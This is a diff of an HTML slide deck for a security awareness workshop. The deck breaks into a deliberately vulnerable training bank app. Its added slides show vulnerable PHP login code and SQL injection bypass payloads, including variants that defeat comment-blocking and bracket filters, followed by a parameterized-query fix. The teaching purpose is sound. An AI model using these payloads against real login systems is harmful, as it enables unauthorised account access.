@@ -262,7 +262,42 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p style="color:var(--t3);font-size:.85rem;margin-top:.5rem">« Ankit Rai • India Lead of Penetration Testing Team • Oct 2026 »</p>
 </div>
 </section>
-<section id="s2" data-phase="Context" class="slide"><div class="slide-inner">
+<section id="s2" data-phase="Context" class="slide"><div class="slide-inner center">
+<p class="sub mb1">Before we start</p>
+<h2 class="mb2">Who is walking you through this</h2>
+<div class="grid3 mt2" style="gap:1rem;text-align:left">
+<div class="card accent-left"><h3 style="font-size:1rem">Who I am</h3><p class="desc mt1" style="font-size:.9rem">[Your name] &mdash; [role], [X] years in [offensive / defensive] security.</p></div>
+<div class="card accent-left"><h3 style="font-size:1rem">What I have done</h3><p class="desc mt1" style="font-size:.9rem">[A credential or two the room will trust in one breath &mdash; engagements led, systems tested, breaches worked, certifications.]</p></div>
+<div class="card accent-left"><h3 style="font-size:1rem">Why I am here today</h3><p class="desc mt1" style="font-size:.9rem">Not to make you security experts &mdash; to let you see, with your own eyes, what your teams are up against.</p></div>
+</div>
+<p class="big center mt3" style="font-size:clamp(1rem,1.6vw,1.2rem);color:var(--t2)">Everything you will see today, I have watched happen to a real organisation.</p>
+</div></section>
+<section id="s3" data-phase="Context" class="slide"><div class="slide-inner center">
+<p class="sub mb1">One question before we dive in</p>
+<h1 class="gradient" style="font-size:clamp(1.6rem,3.2vw,2.4rem)">Why are you in this room?</h1>
+<p class="big mt2">What is the one thing you want to walk out able to do &mdash;<br/>or able to <em>ask</em> &mdash; that you could not this morning?</p>
+<div class="grid3 mt3" style="gap:.8rem;text-align:left">
+<div class="card"><p class="desc" style="font-size:.88rem">Hold that thought. We come back to it at the very end and check whether we got you there.</p></div>
+<div class="card"><p class="desc" style="font-size:.88rem">No wrong answers, no silly questions &mdash; if something is unclear, several others are wondering too.</p></div>
+<div class="card"><p class="desc" style="font-size:.88rem">Say it out loud if you are comfortable &mdash; it tells me where to put the emphasis today.</p></div>
+</div>
+</div></section>
+<section id="s4" data-phase="Context" class="slide"><div class="slide-inner">
+<p class="sub mb1">December 2021 &bull; a true story</p>
+<h2 class="mb2">It started with one line in a log file</h2>
+<div class="grid2 gap2">
+<div>
+<div class="card red-left mb2"><p class="desc"><strong style="color:var(--t1)">A single line of text</strong> &mdash; typed into a username box, a chat message, even a device name &mdash; could take over the server that merely wrote it to a log. No password. No warning.</p></div>
+<div class="card accent-left"><p class="desc">The flaw lived in <strong style="color:var(--t1)">Log4j</strong>, a free logging tool buried inside tens of thousands of products. Most affected companies <strong style="color:var(--red)">did not know they were running it</strong> &mdash; it arrived inside something they had bought.</p></div>
+</div>
+<div>
+<div class="card" style="text-align:center"><p class="sub mb1">Severity</p><p class="gradient" style="font-size:2.6rem;font-weight:800;line-height:1">10.0 / 10</p><p class="desc mt1" style="font-size:.82rem">the maximum score that exists &mdash; called by some &ldquo;the most serious vulnerability in a generation&rdquo;</p></div>
+<div class="card mt2"><p class="desc" style="font-size:.9rem">Teams worked through the holidays to patch it. A year on, systems were <strong>still</strong> breached through it &mdash; because nobody had a full list of where it lived.</p></div>
+</div>
+</div>
+<p class="big center mt3" style="font-size:clamp(1rem,1.6vw,1.2rem)">That gap is what today is about: the distance between <em>&ldquo;we are fine&rdquo;</em> and <em>&ldquo;we do not actually know.&rdquo;</em></p>
+</div></section>
+<section id="s5" data-phase="Context" class="slide"><div class="slide-inner">
 <p class="sub mb1">Why you&rsquo;re in this room</p>
 <h2 class="mb2">The security team finds the problem. <span style="color:var(--amber)">You decide what happens next.</span></h2>
 <p class="desc mb2">You don&rsquo;t write the code or run the pen test. But these calls are yours &mdash; and they usually land under deadline pressure:</p>
@@ -281,7 +316,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 </div>
 <p class="mt3 center" style="color:var(--t3);font-size:.92rem">The aim isn&rsquo;t to turn you into a penetration tester. It&rsquo;s that the next time one of these decisions reaches you, you weigh it on <strong style="color:var(--t2)">evidence you have seen first-hand</strong> &mdash; not a summary you cannot question.</p>
 </div></section>
-<section id="s3" data-phase="Context" class="slide"><div class="slide-inner">
+<section id="s6" data-phase="Context" class="slide"><div class="slide-inner">
 <h2 class="mb2">Agenda &mdash; 90 Minutes</h2>
 <div class="flex-col" style="max-width:820px">
 <div class="agenda-item"><div class="agenda-num" style="background:var(--indigo);color:#fff">1</div><div><strong style="color:var(--t1)">How attacks are actually built</strong> <span style="color:var(--t3)">&mdash; 8 min</span><br/><span style="color:var(--t2);font-size:.9rem">The threat economy, and the assumptions that create attack paths</span></div></div>
@@ -291,7 +326,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <div class="agenda-item"><div class="agenda-num" style="background:var(--green);color:#042713">5</div><div><strong style="color:var(--t1)">Questions to ask before production</strong> <span style="color:var(--t3)">&mdash; 7 min</span><br/><span style="color:var(--t2);font-size:.9rem">What you take back to design reviews, risk calls and release decisions</span></div></div>
 </div>
 </div></section>
-<section id="s4" data-phase="Context" class="slide"><div class="slide-inner">
+<section id="s7" data-phase="Context" class="slide"><div class="slide-inner">
 <p class="sub mb1">The shape of today</p>
 <h2 class="mb2">What the next 90 minutes look like</h2>
 <div class="flow">
@@ -316,7 +351,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <div class="chain-step" style="border-left-color:var(--red)"><div class="cs-id">BEAT 5</div><div class="cs-t">Who it happened to</div><div class="cs-d">A real organisation, a real cost, and the question it should raise for us.</div></div>
 </div>
 </div></section>
-<section id="s5" data-phase="Context" class="slide"><div class="slide-inner">
+<section id="s8" data-phase="Context" class="slide"><div class="slide-inner">
 <p class="sub mb1">How each lab works</p>
 <h2>I show you. Then you do it yourself &mdash; on a harder setting.</h2>
 <div class="grid3 mt3">
@@ -327,18 +362,19 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="big center mt3">Everything is doable with a browser and its developer tools.<br/>No tooling to install, no command line required.</p>
 <p class="sub center mt2">Ask questions the moment something does not make sense.<br/>If one of you is lost, several others are too.</p>
 </div></section>
-<section id="s6" data-phase="Context" class="slide"><div class="slide-inner">
+<section id="s9" data-phase="Context" class="slide"><div class="slide-inner">
 <p class="sub mb1">The security mindset</p>
-<h2 class="mb1">You will never hear a careless sentence. You will hear a reasonable one.</h2>
-<p class="desc mb2">Every statement on the left is something a competent engineer says in a real meeting, in good faith. The attacker hears the same sentence and asks a different question about it.</p>
+<h2 class="mb1">The same feature, read two ways</h2>
+<div class="card accent-left mb2" style="padding:.7rem 1rem">
+<p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">The price travelled in the receipt.</strong> An online shop put each item&rsquo;s price in a hidden field on the page, so it could show you your total &mdash; sensible, and every developer who built it was right. Then someone opened the request, changed <code>price: 4999</code> to <code>price: 1</code>, and bought a laptop for a pound. Nobody broke in. The shop was simply <strong style="color:var(--red)">trusting the shopper to report the price honestly.</strong></p>
+</div>
+<p class="big center mb2" style="font-size:clamp(.95rem,1.5vw,1.15rem);color:var(--t2)">Nothing there was a mistake &mdash; the vulnerability was a piece of trust nobody noticed they had placed.</p>
+<p class="desc mb1">A developer hears a reasonable sentence. An attacker hears the same sentence and asks a different question:</p>
 <table class="mt1" id="mindset-table">
 <thead><tr><th style="width:46%">What you will hear in the room</th><th class="atk-col" style="opacity:0;transition:opacity .5s">What an attacker hears</th></tr></thead>
 <tbody>
 <tr><td><em>&ldquo;That field is read-only in the interface.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Read-only in your browser. I am not using your browser.&rdquo;</em></td></tr>
 <tr><td><em>&ldquo;Only logged-in users can reach that page.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Logged in as whom &mdash; and entitled to see whose data?&rdquo;</em></td></tr>
-<tr><td><em>&ldquo;It is an internal API. It is not exposed.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Then I need one foothold inside, and everything internal becomes my API.&rdquo;</em></td></tr>
-<tr><td><em>&ldquo;We are on HTTPS, the traffic is encrypted.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Encryption hides the traffic from outsiders. I am sending the attack <u>through</u> it.&rdquo;</em></td></tr>
-<tr><td><em>&ldquo;Nobody knows that URL exists.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Neither did I. Something I automated found it in nine seconds.&rdquo;</em></td></tr>
 <tr><td><em>&ldquo;That library is standard &mdash; everyone uses it.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Including me. I know its default settings better than your team does.&rdquo;</em></td></tr>
 <tr><td><em>&ldquo;We have never had a problem with it.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;That you know of. Nothing here is watching.&rdquo;</em></td></tr>
 </tbody>
@@ -349,8 +385,8 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="big" id="mindset-post" style="font-size:clamp(1rem,1.6vw,1.2rem);display:none">Every one of them is <strong>true</strong> &mdash; and every one is doing the job of a security control without being one.<br/>You do not need to know the answer. You need to notice when a sentence is being used as a safeguard.</p>
 </div>
 </div></section>
-<section id="s7" data-phase="Context" class="slide"><div class="slide-inner"><p class="sub mb1">The threat economy</p><h2>An exploit is not the whole attack. It is one product in a supply chain.</h2><div class="flow mt3"><div class="flow-step"><strong>Access broker</strong><p class="desc mt1">Obtains or sells initial access</p></div><div class="flow-arrow">→</div><div class="flow-step"><strong>Exploit / tooling</strong><p class="desc mt1">Turns a weakness into capability</p></div><div class="flow-arrow">→</div><div class="flow-step"><strong>Operator</strong><p class="desc mt1">Moves, persists and steals</p></div><div class="flow-arrow">→</div><div class="flow-step"><strong>Monetisation</strong><p class="desc mt1">Fraud, extortion or resale</p></div></div><div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">Leadership lens:</strong> reducing demand for emergency response means disrupting the chain early: secure engineering, identity controls, segmentation, detection and rehearsed recovery.</p></div><p class="source-note"></p></div></section>
-<section id="s8" data-phase="Context" class="slide"><div class="slide-inner">
+<section id="s10" data-phase="Context" class="slide"><div class="slide-inner"><p class="sub mb1">The threat economy</p><h2>An exploit is not the whole attack. It is one product in a supply chain.</h2><div class="flow mt3"><div class="flow-step"><strong>Access broker</strong><p class="desc mt1">Obtains or sells initial access</p></div><div class="flow-arrow">→</div><div class="flow-step"><strong>Exploit / tooling</strong><p class="desc mt1">Turns a weakness into capability</p></div><div class="flow-arrow">→</div><div class="flow-step"><strong>Operator</strong><p class="desc mt1">Moves, persists and steals</p></div><div class="flow-arrow">→</div><div class="flow-step"><strong>Monetisation</strong><p class="desc mt1">Fraud, extortion or resale</p></div></div><div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">Leadership lens:</strong> reducing demand for emergency response means disrupting the chain early: secure engineering, identity controls, segmentation, detection and rehearsed recovery.</p></div><p class="source-note"></p></div></section>
+<section id="s11" data-phase="Context" class="slide"><div class="slide-inner">
 <p class="sub mb1">Why your team keeps asking</p>
 <h2 class="mb2">&ldquo;We just patched that. Why again?&rdquo; <span style="color:var(--amber)">Because attention is the vulnerability.</span></h2>
 <div class="grid2 gap2">
@@ -360,10 +396,9 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <div class="card red-left"><h3>The window has collapsed</h3><p class="desc mt1" style="font-size:.9rem">A <em>zero-day</em> is exploited before a patch exists. The moment one is disclosed and patched it becomes an <em>N-day</em> &mdash; and the race is to apply the fix before attackers weaponise it, now a matter of <strong style="color:var(--t1)">hours</strong>. &ldquo;Patch now&rdquo; is the exploitation clock, not drama.</p></div>
 </div>
 <div class="card accent-left mt3" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.93rem"><strong style="color:var(--t1)">Leadership lens:</strong> frequent patching of the same product is not the team overreacting &mdash; it is the predictable cost of running a popular, internet-facing target. Patch SLAs and maintenance windows are how you stay ahead of an N-day; and a vendor&rsquo;s <strong style="color:var(--t1)">patch quality and track record is itself a risk decision</strong> &mdash; one you make when you choose a product, and every time you renew it.</p></div>
-<p class="source-note">Anchor: MOVEit (2023) &mdash; one flaw in a widely-used file-transfer tool, mass-exploited across hundreds of organisations within days. Edge appliances (VPNs, firewalls) cluster CVEs for the same reason: that is where the value and the attention concentrate.</p>
 </div></section>
-<section id="s9" data-phase="Context" class="slide"><div class="slide-inner"><p class="sub mb1">When cyber risk becomes business survival</p><h2>Not every incident closes a company, but some can remove its ability to operate.</h2><div class="grid3 mt2"><div class="card"><h3>Code Spaces</h3><p class="desc mt1">A destructive cloud-account compromise became a widely cited example of a technology business ceasing operations after loss of systems and backups.</p></div><div class="card"><h3>NotPetya / Maersk</h3><p class="desc mt1">A trusted software pathway and rapid propagation caused global operational disruption, showing how connected infrastructure amplifies local compromise.</p></div><div class="card"><h3>Travelex</h3><p class="desc mt1">A ransomware incident disrupted services and became part of a wider period of financial and operational stress. Avoid claiming cyber was the sole cause of later business outcomes.</p></div></div><div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">Facilitator rule:</strong> separate confirmed facts from interpretation. Use “contributed to”, “disrupted” or “amplified” unless a primary source establishes sole causation.</p></div><p class="source-note">Presenter sources to retain: Maersk annual reporting / public statements; official incident or administrator records where available. Avoid unsupported breach-cost or shutdown claims.</p></div></section>
-<section id="s10" data-phase="Context" class="slide">
+<section id="s12" data-phase="Context" class="slide"><div class="slide-inner"><p class="sub mb1">When cyber risk becomes business survival</p><h2>Not every incident closes a company, but some can remove its ability to operate.</h2><div class="grid3 mt2"><div class="card"><h3>Code Spaces</h3><p class="desc mt1">A destructive cloud-account compromise became a widely cited example of a technology business ceasing operations after loss of systems and backups.</p></div><div class="card"><h3>NotPetya / Maersk</h3><p class="desc mt1">A trusted software pathway and rapid propagation caused global operational disruption, showing how connected infrastructure amplifies local compromise.</p></div><div class="card"><h3>Travelex</h3><p class="desc mt1">A ransomware incident disrupted services and became part of a wider period of financial and operational stress. Avoid claiming cyber was the sole cause of later business outcomes.</p></div></div><div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">Facilitator rule:</strong> separate confirmed facts from interpretation. Use “contributed to”, “disrupted” or “amplified” unless a primary source establishes sole causation.</p></div><p class="source-note">Presenter sources to retain: Maersk annual reporting / public statements; official incident or administrator records where available. Avoid unsupported breach-cost or shutdown claims.</p></div></section>
+<section id="s13" data-phase="Context" class="slide">
 <div class="slide-inner">
 <h2 class="mb1">Meet BankSploit</h2>
 <p class="desc mb2">A fully functional retail banking application. Real features, real workflows, real data.</p>
@@ -378,7 +413,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="mt2 center" style="color:var(--t3);font-size:.9rem">Built on PHP 8.3 / MySQL 8 • No frameworks • Realistic Indian retail-banking UI</p>
 </div>
 </section>
-<section id="s11" data-phase="Context" class="slide">
+<section id="s14" data-phase="Context" class="slide">
 <div class="slide-inner center">
 <p style="font-size:5rem;margin-bottom:1rem">🏛️</p>
 <h2>Developers build and maintain applications like this.</h2>
@@ -386,7 +421,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="mt3" style="color:var(--t3);font-size:.95rem">« Live app walkthrough: login → dashboard → transfer → statements »</p>
 </div>
 </section>
-<section id="s12" data-phase="Context" class="slide"><div class="slide-inner center">
+<section id="s15" data-phase="Context" class="slide"><div class="slide-inner center">
 <h1 class="gradient" style="font-size:clamp(1.8rem,3.8vw,2.9rem)">This bank has 8 critical vulnerabilities.</h1>
 <p class="big mt2">None of them are visible from the user interface.</p>
 <p class="big">Every one is exploitable with just a browser.</p>
@@ -401,7 +436,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">G9 &mdash; Command injection</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Take over the server itself</p></div>
 </div>
 </div></section>
-<section id="s13" data-phase="Context" class="slide section-slide">
+<section id="s16" data-phase="Context" class="slide section-slide">
 <div class="slide-inner center">
 <div class="icon">🔴</div>
 <p class="sub">Phase 2</p>
@@ -409,7 +444,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="big mt2" style="color:var(--t2)">We're going to break into this bank.</p>
 </div>
 </section>
-<section id="s14" data-phase="Live Labs" class="slide">
+<section id="s17" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <div class="flex-row mb2">
 <span class="badge badge-red">🔴 Demo 1</span>
@@ -419,60 +454,67 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="big mt2">"We're going to log in as anyone, without their password."</p>
 </div>
 </section>
-<section id="s15" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<h3 class="mb2">How Login Normally Works</h3>
-<p class="desc mb2">You type your Customer ID and password. The server checks the database.</p>
-<pre><code><span class="kw">SELECT</span> * <span class="kw">FROM</span> users
-<span class="kw">WHERE</span> customer_id = <span class="str">'BS100234'</span>
-  <span class="kw">AND</span> password_md5 = <span class="str">'5f4dcc3b5aa765d...'</span></code></pre>
-<p class="mt2 desc">If the Customer ID and password match a row in the database, you're in. Simple and correct — as long as the input is handled safely.</p>
-</div>
-</section>
-<section id="s16" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<h3 class="mb2">The Attack</h3>
-<div class="grid2 gap2">
+<section id="s18" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="sol-head"><span class="sol-tag">G1</span><div><div class="sol-cwe">CWE-89 &middot; A03:2021 &middot; Level 0 &mdash; live demo</div><h2 style="margin:.06em 0">SQL Injection &mdash; Login Bypass</h2><div class="sol-where">&#128205; /login &mdash; Customer ID box</div></div></div>
+<div class="grid2 mt2">
 <div>
-<p class="sub">What we type</p>
-<div class="card red-left mt1">
-<p style="color:var(--t3);font-size:.85rem">Customer ID:</p>
-<p style="font-family:var(--mono);font-size:1.2rem;color:var(--red)">BS100234' --  </p>
-<p style="color:var(--t3);font-size:.85rem;margin-top:.5rem">Password:</p>
-<p style="font-family:var(--mono);font-size:1.2rem;color:var(--t2)">anything</p>
-</div>
+<p class="sub mb1">How login normally works</p>
+<pre class="sol-code">SELECT * FROM users WHERE customer_id = 'BS100234' AND password_md5 = '5f4dcc3b&hellip;'</pre>
+<p class="desc">Customer ID and password must match a row &mdash; correct, as long as the input is handled as <b>data</b>.</p>
+<p class="sub mb1 mt3">The vulnerable code</p>
+<pre class="sol-code"><span class="cmt">// login_vuln.php &mdash; Level 0</span>
+$sql = "&hellip; WHERE customer_id = '" . <span class="inj">$cid</span> . "' AND password_md5 = '" . md5($pw) . "'";</pre>
+<p class="desc"><code>$cid</code> is pasted straight into the SQL &mdash; whatever you type becomes query logic.</p>
 </div>
 <div>
-<p class="sub">What the server executes</p>
-<pre class="mt1"><code><span class="kw">SELECT</span> * <span class="kw">FROM</span> users
-<span class="kw">WHERE</span> customer_id = <span class="str">'BS100234'</span><span class="vuln-hl"> -- '</span>
-  <span class="cm">AND password_md5 = '...'</span></code></pre>
-<p class="desc mt1">The <code>--</code> turns the password check into a comment. The database never evaluates it. We're in.</p>
+<p class="sub mb1">The attack</p>
+<p class="desc">Enter this as the Customer ID (any password):</p>
+<div class="sol-pay">BS100234' #</div>
+<div class="sol-paynote">your own Customer ID + <code>'</code> + <code>#</code></div>
+<pre class="sol-code mt3">SELECT * FROM users WHERE customer_id = '<span class="inj">BS100234' #</span>' AND password_md5 = '&hellip;' <span class="cmt">&larr; commented out, never runs</span></pre>
+<p class="desc">The <code>'</code> closes the ID string; <code>#</code> comments out the password check. The database never evaluates the password. We&rsquo;re in.</p>
 </div>
 </div>
-</div>
-</section>
-<section id="s17" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<h3 class="mb1">The Vulnerable Code</h3>
-<p class="desc mb2">From the actual login handler — the user's input is concatenated directly into the SQL string.</p>
-<pre><code><span class="cm">// login_vuln.php — Level 0: classic SQL injection</span>
-<span class="var">$sql</span> = <span class="str">"SELECT id, customer_id, name, role FROM users "</span>
-     . <span class="str">"WHERE customer_id = '"</span> . <span class="vuln-hl">$cid</span> . <span class="str">"' "</span>
-     . <span class="str">"AND password_md5 = '"</span> . <span class="fn">md5</span>(<span class="var">$password</span>) . <span class="str">"' LIMIT 1"</span>;
-
-<span class="var">$result</span> = <span class="var">$pdo</span>-&gt;<span class="fn">query</span>(<span class="var">$sql</span>);</code></pre>
-<p class="mt2 desc"><span class="vuln-hl">$cid</span> — User-supplied value pasted directly into SQL. Whatever the user types becomes part of the query. The attacker controls the database logic.</p>
-</div>
-</section>
-<section id="s18" data-phase="Live Labs" class="slide">
+</div></section>
+<section id="s19" data-phase="Live Labs" class="slide">
 <div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.6rem,3vw,2.4rem)">This bank's entire authentication just collapsed because of one missing function call.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">SQL injection is a 25-year-old vulnerability class.<br/>It's still in the OWASP Top 10.<br/>It's still being written today.</p>
 </div>
 </section>
-<section id="s19" data-phase="Live Labs" class="slide">
+<section id="s20" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G1 &bull; SQL injection</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">the text you typed, as part of the login query</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;Is user input ever built into a query, or always kept as data?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc"><strong>IAM &amp; federated SSO</strong> (Okta, Entra, Google) &mdash; so the app never owns the password or builds the login query itself</p></div>
+</div>
+</div></section>
+<section id="s21" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G1 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Log In Without Any Password</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You logged in to another customer&rsquo;s account without ever knowing their password.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
+</div>
+</div>
+
+</div>
+</div></section>
+<section id="s22" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb1">The Fix — And Why It Works</h3>
 <div class="grid2 gap2">
@@ -494,14 +536,14 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <div class="card green-left">
 <p class="desc"><strong style="color:var(--green)">Step 1:</strong> The database receives the SQL template and compiles it into an execution plan. The <strong>query structure is locked</strong>.</p>
 <p class="desc mt1"><strong style="color:var(--green)">Step 2:</strong> User data (<code>:cid</code>) is sent <strong>separately</strong> and bound to the placeholder as a literal value.</p>
-<p class="desc mt1"><strong style="color:var(--green)">Step 3:</strong> The data is <strong>never parsed as SQL</strong>. Even if the user types <code>' OR 1=1 --</code>, the database treats the entire string as a value to search for — not as code to execute.</p>
+<p class="desc mt1"><strong style="color:var(--green)">Step 3:</strong> The data is <strong>never parsed as SQL</strong>. Even if the user types <code>' OR 1=1 #</code>, the database treats the entire string as a value to search for — not as code to execute.</p>
 </div>
 <p class="desc mt1" style="font-size:.85rem;color:var(--t3)">Think of a printed form with blank fields. The form's structure is fixed. Whatever you write in the blanks is content — you can't rewrite the form itself.</p>
 </div>
 </div>
 </div>
 </section>
-<section id="s20" data-phase="Live Labs" class="slide">
+<section id="s23" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left">
@@ -513,7 +555,16 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 <p class="mt2 big center">"This is a 25-year-old vulnerability. Automated tools detect it.<br/>The question is: does your SAST pipeline run before merge?"</p>
 </div>
 </section>
-<section id="s21" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s24" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><div><div class="sol-cwe">CWE-89 · A03:2021</div><h2 style="margin:.06em 0">SQL Injection — Login Bypass</h2><div class="sol-where">&#128205; /login — Customer ID box</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Sign in as <b>your own</b> account without knowing the password.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">Your Customer ID is <b>concatenated straight into the login SQL</b>. A single quote ends the string literal, and everything you type after it is parsed as SQL — so you can rewrite the query's logic and drop the password check.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw query, DB error shown</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">+ blacklist on comments/UNION</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">blind + bracketed + comment filter</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">parameterized + bcrypt</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> a parameterized query (<code>customer_id = ?</code>) + <code>password_verify()</code> (bcrypt), one generic “Invalid credentials” message, and a 5-attempt lockout. Input is data, never SQL.</p></div></div></div></div></section>
+<section id="s25" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Naive blacklist</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Login Bypass</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Blocks <code>--</code>, <code>#</code>, <code>/*</code> and <code>union</code> (rejects “Illegal characters”). The comment trick now fails — but <code>OR</code> is <b>not</b> blocked.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">You can't comment, so make the row match another way. <code>AND</code> binds tighter than <code>OR</code>, so an un-bracketed <code>OR</code> on your Customer ID is enough.</p></div></div><pre class="sol-code">WHERE customer_id = '<span class="inj">BS100234' OR '1'='1</span>'
+  AND password_md5 = '…'
+<span class="cmt">reads as:  customer_id='BS100234'  OR  ('1'='1' AND password=…)
+            └─ true on its own → row returned</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">BS100234' OR '1'='1</div><div class="sol-paynote">no comment needed</div></div></section>
+<section id="s26" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Blind + brackets + comment filter</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Login Bypass</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">DB error <b>hidden</b> (blind). The Customer ID test is wrapped in <code>( )</code> with the password check <b>outside</b> the brackets. Comment tokens are also blacklisted — rejected with a <b>generic “Invalid credentials”</b> (same as a wrong password, so you can't even tell the filter tripped).</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">A bare <code>OR</code> is now trapped inside the brackets, and you can't comment the tail away. <b>Supply the closing <code>)</code> yourself</b> to escape the parens, then <code>OR</code> at the top level — the query's own trailing <code>')</code> balances your quote. No comment.</p></div></div><pre class="sol-code">WHERE (customer_id = '<span class="inj">BS100234') OR ('1'='1</span>')
+  AND password_md5 = '…'
+<span class="cmt">reads as:  (customer_id='BS100234')  OR  ('1'='1' AND password=…)
+            password branch is false → whole clause = customer_id='BS100234'</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">BS100234') OR ('1'='1</div><div class="sol-paynote">close the bracket, OR outside it</div><div class="sol-lesson">&#128161; Comment-blacklisting is <b>not</b> a SQLi defence — you break the bracket without one.</div></div></section>
+<section id="s27" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Fortinet, 2024 &mdash; SQL injection inside a security product</h2>
 <div class="rw mt2">
@@ -523,16 +574,68 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
